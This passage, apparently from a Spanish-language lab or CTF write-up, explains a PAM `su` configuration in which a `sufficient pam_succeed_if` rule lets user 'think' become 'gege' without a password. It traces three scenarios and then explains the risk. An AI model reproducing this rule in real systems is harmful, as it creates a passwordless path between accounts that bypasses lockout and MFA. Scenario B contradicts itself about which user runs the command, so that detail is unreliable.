   - `defualt=1`: Si la condición ***NO*** se cumple, salta ***1*** línea en el archivo de configuración (omite la siguiente regla).

### Análisis paso a paso del bloque de código

Veamos como interpreta PAM la sección `auth` de nuestro archivo cuando ejecutamos un comando `su`:

```
# Regla 1: Si somos root, no pide contraseña.
auth       sufficient pam_rootok.so

# Regla 2: ¿El usuario objetivo es 'gege'?
auth  [success=ignore default=1] pam_succeed_if.so user = gege

# Regla 3: ¿El usuario origen (quien ejecuta su) es 'think'?
auth  sufficient                 pam_succeed_if.so use_uid user = think

# Regla 4: Módulos estándar (donde se solicita la contraseña)
@include common-auth
```

#### Escenario A: El usuario `think` ejecuta `su gege`

- **Regla 1 (`pam_rootok.so`)**: Verifica si quien ejecuta el comando es `root`. Como es `think`, esta regla no aplica y PAM pasa a la Regla 2.
- **Regla 2 (`user = gege`)**: Verifica si el usuario al que se quiere acceder es `gege`.
    - **Resultado**: Verdadero. Como la acción para `success` es `ignore`, PAM pasa a la **Regla 3**.
- **Regla 3 (`use_uid user = think`)**: Verifica si el UID del usuario que lanzó el comando corresponde a `think`.
    - **Resultado**: Verdadero. Como esta regla tiene el flag **`sufficient`**, PAM da la autenticación por completada con éxito inmediatamente.
- **Resultado Final**: PAM **nunca llega a ejecutar `@include common-auth`**, por lo que no solicita ninguna contraseña y otorga la sesión.

#### Escenario B: Un usuario diferente (ej: `think`) ejecuta `su gege`

- **Regla 1**: Falla (no es `root`).
- **Regla 2**: El usuario objetivo es `gege` (Verdadero). Pasa a la Regla 3.
- **Regla 3**: Verifica si el usuario origen es `think`. Como es `juan`, la regla devuelve un fallo.
- **Resultado Final**: No se activa el flag `sufficient`. PAM continúa el flujo hacia `@include common-auth`, solicitando la contraseña del usuario `gege`.

#### Escenario C: El usuario `think` ejecuta `su admin`

- **Regla 1**: Falla (no es `root`).
- **Regla 2**: Verifica si el usuario objetivo es `gege`. Como el objetivo es `admin`, la condición **no se cumple**.
    - Se activa la acción `default=1`, que ordena a PAM **saltar 1 línea**.
- **Salto**: PAM omite por completo la Regla 3 y cae directamente en `@include common-auth`.
- **Resultado Final**: Se solicita la contraseña de `admin`.

### Por qué se considera una configuración de alto riesgo?

- ***Bypass de Controles Globales***: Al colocar reglas `sufficient` antes de `@include common-auth`, se evitan todos los mecanismos de seguridad estándar implementados en la máquina (como comprobaciones de contraseñas expiradas, bloqueos por intentos fallidos con `pam_faillock`, o autenticación multifactor).
- ***Mantenimiento Ciego***: Si el archivo de configuración es modificado sin documentación, un administrador podría no percatarse de que existe una vía de suplantación directa entre cuentas sin requerir credenciales.
